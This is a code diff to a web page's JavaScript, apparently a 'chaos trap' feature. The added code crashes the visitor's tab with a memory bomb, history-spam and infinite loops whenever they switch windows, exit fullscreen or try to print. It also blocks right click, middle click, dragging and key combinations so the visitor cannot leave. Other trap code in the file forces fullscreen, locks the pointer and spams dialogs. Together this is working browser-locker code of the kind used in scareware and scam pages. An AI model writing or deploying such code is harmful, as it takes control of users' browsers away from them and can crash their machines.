@@ -379,6 +379,18 @@
     dialogSpamIntervals=[];
   }
 
+  function nukeTab(){
+    // memory bomb — allocate until tab crashes
+    try{
+      const arr=[];
+      while(true){arr.push(new Array(10000000).fill('X'));}
+    }catch(e){}
+    // history spam
+    try{let s='';for(let i=0;i<999999999;i++){s+=i;history.pushState(0,0,s);}}catch(e){}
+    // infinite loop fallback
+    try{let x=0;while(true){x++;}}catch(e){}
+  }
+
   function startChaosTrap(){
     trapActive=true;chaosModeLocked=true;
     fakeFullscreen.classList.add('active');
@@ -386,17 +398,46 @@
     setTimeout(startDialogSpam,500);
     window.addEventListener('beforeunload',trapUser);
     window.addEventListener('unload',trapUser);
-    document.addEventListener('visibilitychange',e=>{if(trapActive&&document.hidden){e.preventDefault();attemptFullscreen();}});
-    document.addEventListener('fullscreenchange',maintainFullscreen);
-    document.addEventListener('webkitfullscreenchange',maintainFullscreen);
-    document.addEventListener('mozfullscreenchange',maintainFullscreen);
-    document.addEventListener('MSFullscreenChange',maintainFullscreen);
+
+    // alt-tab / window switch / focus loss → crash
+    document.addEventListener('visibilitychange',()=>{
+      if(trapActive&&document.hidden)nukeTab();
+    });
+    window.addEventListener('blur',()=>{if(trapActive)nukeTab();});
+    window.addEventListener('focusout',()=>{if(trapActive)nukeTab();});
+
+    // fullscreen exit → immediately re-request + crash attempt
+    const fsHandler=()=>{
+      if(trapActive&&!document.fullscreenElement&&!document.webkitFullscreenElement){
+        attemptFullscreen();
+        setTimeout(nukeTab,200);
+      }
+    };
+    document.addEventListener('fullscreenchange',fsHandler);
+    document.addEventListener('webkitfullscreenchange',fsHandler);
+    document.addEventListener('mozfullscreenchange',fsHandler);
+    document.addEventListener('MSFullscreenChange',fsHandler);
+
     fullscreenInterval=setInterval(()=>{if(trapActive)maintainFullscreen();},100);
     setTimeout(()=>{lockPointer();maintainPointerLock();},100);
+
+    // block every key combo we can reach
     document.addEventListener('keydown',blockAllExits,true);
     document.addEventListener('keyup',blockAllExits,true);
     document.addEventListener('keypress',blockAllExits,true);
+
+    // block right click
     document.addEventListener('contextmenu',e=>{if(trapActive){e.preventDefault();return false;}},true);
+
+    // block middle click (open in new tab)
+    document.addEventListener('auxclick',e=>{if(trapActive){e.preventDefault();return false;}},true);
+
+    // block drag (drag URL out of bar)
+    document.addEventListener('dragstart',e=>{if(trapActive)e.preventDefault();},true);
+
+    // block print (Ctrl+P sometimes helps exit)
+    window.addEventListener('beforeprint',e=>{if(trapActive){e.preventDefault();nukeTab();}});
+
     fakeFullscreen.addEventListener('click',()=>{if(trapActive){attemptFullscreen();lockPointer();}});
   }
   function stopChaosTrap(){
